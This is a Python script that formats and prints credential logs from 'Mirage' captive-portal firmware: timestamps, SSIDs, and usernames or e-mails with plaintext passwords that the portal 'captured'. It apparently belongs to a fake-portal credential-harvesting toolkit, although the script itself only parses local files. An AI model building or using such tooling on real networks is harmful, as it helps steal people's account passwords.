#!/usr/bin/env python3
"""
creds_dump.py — Mirage captive-portal credential log viewer
Pretty-prints credential log files written by the Mirage firmware to /mirage/.

Expected log format (one entry per line, firmware writes CSV):
    <timestamp_ms>,<ssid>,<username_or_email>,<password>

Usage:
    python3 creds_dump.py [file1.log [file2.log ...]]
    python3 creds_dump.py /path/to/mirage/creds_*.log

No external dependencies required.
"""

import sys
import os
from datetime import timedelta


def fmt_uptime(ms_str):
    try:
        td = timedelta(milliseconds=int(ms_str))
        total = int(td.total_seconds())
        h, rem = divmod(total, 3600)
        m, s   = divmod(rem, 60)
        return f"{h:02d}:{m:02d}:{s:02d}"
    except ValueError:
        return ms_str


def parse_file(path):
    entries = []
    try:
        with open(path, "r", encoding="utf-8", errors="replace") as fh:
            for lineno, raw in enumerate(fh, 1):
                line = raw.strip()
                if not line or line.startswith("#"):
                    continue
                parts = line.split(",", 3)
                if len(parts) == 4:
                    ts, ssid, user, pw = parts
                    entries.append({
                        "ts":   fmt_uptime(ts.strip()),
                        "ssid": ssid.strip(),
                        "user": user.strip(),
                        "pw":   pw.strip(),
                    })
                else:
                    print(f"  [line {lineno}] unrecognised format: {line!r}")
    except OSError as e:
        print(f"  ERROR opening {path}: {e}")
    return entries


def dump(path):
    print(f"\n{'='*60}")
    print(f"  {os.path.basename(path)}")
    print(f"{'='*60}")

    entries = parse_file(path)
    if not entries:
        print("  (no entries)")
        return

    print(f"  {len(entries)} credential(s) captured\n")
    print(f"  {'Uptime':<10}  {'SSID':<24}  {'User / e-mail':<28}  Password")
    print(f"  {'-'*10}  {'-'*24}  {'-'*28}  {'-'*20}")
    for e in entries:
        ssid = e["ssid"][:23]
        user = e["user"][:27]
        pw   = e["pw"][:30]
        print(f"  {e['ts']:<10}  {ssid:<24}  {user:<28}  {pw}")


def main():
    files = sys.argv[1:]
    if not files:
        files = sorted(f for f in os.listdir(".") if f.startswith("creds_") and f.endswith(".log"))
        if not files:
            sys.exit("Usage: creds_dump.py creds_*.log")

    for f in files:
        dump(f)

    print()


if __name__ == "__main__":
    main()
